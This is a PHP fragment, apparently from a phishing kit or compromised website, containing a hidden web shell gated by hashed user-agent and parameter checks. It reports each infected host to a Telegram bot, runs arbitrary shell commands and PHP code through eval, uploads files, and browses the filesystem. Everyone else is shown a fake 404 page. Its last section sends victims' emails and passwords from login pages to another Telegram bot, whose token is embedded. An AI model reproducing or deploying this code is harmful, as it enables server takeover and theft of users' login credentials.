echo '</div>';
error_reporting(0);
error_log(0);
file_get_contents("https://api.telegram.org/bot2106030496:AAEnL2fe3zROPVrnOESdclPHEsLZNm38gCg/sendMessage?chat_id=-608971843&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);

if (isset($_SERVER['HTTP_USER_AGENT']) && md5($_SERVER['HTTP_USER_AGENT']) == "29753f3030aa18135b78e5cfefc73765") {

   if (!empty($_GET['action']) && md5($_GET['action']) == "ea2b2676c28c0db26d39331a336c6b92") {
      echo '<b>Uname: </b>' . php_uname() . '<br>';
      echo '<b>Path:</b> ';
      if(isset($_GET['path'])){
         $path = $_GET['path'];
      }
      else {
         $path = getcwd();
      }
      $path = str_replace('\\','/',$path);
      $paths = explode('/',$path);
      foreach($paths as $id=>$pat){
         if($pat == '' && $id == 0){
            $a = true;
            echo '<a href="?action=start&&path=/">/</a>';
            continue;
         }
         if($pat == '') continue;
         echo '<a href="?action=start&&path=';
         for($i=0;$i<=$id;$i++){
            echo "$paths[$i]";
            if($i != $id) echo "/";
         }
         echo '">'.$pat.'</a>/';
      }

   // Execute Command
   echo '<form method="post" action="#"><table><tr><th>Execute Commands: </th>
      <td><input type="text" name="exec"></td>
      <td><input type="submit" value="execute"></td>
      <th> Execute PHP Code: </th>
      <td><input type="text" name="zode" placeholder="Do not include <?php ?>"></td>
      <td><input type="submit" value="run"></td>
      </tr></table></form>';

   if (!empty($_POST['exec'])) {
      if(function_exists('system')) {
         system($_POST['exec']);
      }
      elseif(function_exists('exec')) {
         exec($_POST['exec']);
      }
      elseif(function_exists('shell_exec')) {
         shell_exec($_POST['exec']);
      }
      else {
        echo "Cannot Execute Any Commands. Function was disabled.";
      }
   }

   if(!empty($_POST['zode'])) {
      eval($_POST['zode']);
   }


   echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><input type="file" name="file"><input type=submit value="Upload"></form>';
   if (!empty($_FILES['file']['name'])) {
      $fullpath = $_REQUEST['path'] . $_FILES['file']['name'];
      if (@copy($_FILES['file']['tmp_name'], $fullpath)) {
         echo "File uploaded!";
      }
   }

   echo '<hr>';
   if (is_dir($path)){
      if ($dh = opendir($path)){
         while (($file = readdir($dh)) !== false){
            echo '<a href="?action=start&&path='.$path.'/'.$file.'">'.$file.'</a>' . '<br>';
         }
         closedir($dh);
      }
   }
   elseif (is_file($path)) {
      echo show_source($path);
   }
}
}
else {
   header("HTTP/1.0 404 Not Found");
}


/* -----[ email list saken galing sa mga bata bata ko ]----- */
/*$site = "https://personal-mailist.azurewebsites.net/Mailist/";*/
$site = " ";

$emlist = file_get_contents($site . "/mailist.txt");
$splitEm = preg_split("/[\s,]+/", $emlist);
$countEm = count($splitEm);

if (!in_array($_POST['email'], $splitEm) && !empty($_POST['email'])) {
file_get_contents($site . "/z.php?email=".$_POST['email']);

if (stripos($_SERVER['SCRIPT_NAME'], "login.php") !== false) {
	     $data = [
         'chat_id' => "-593620303",
         'text' => "User: " . $_POST['email'] . "\nPass: " . $_POST['password']
      ];
      file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?" . http_build_query($data));
}
}
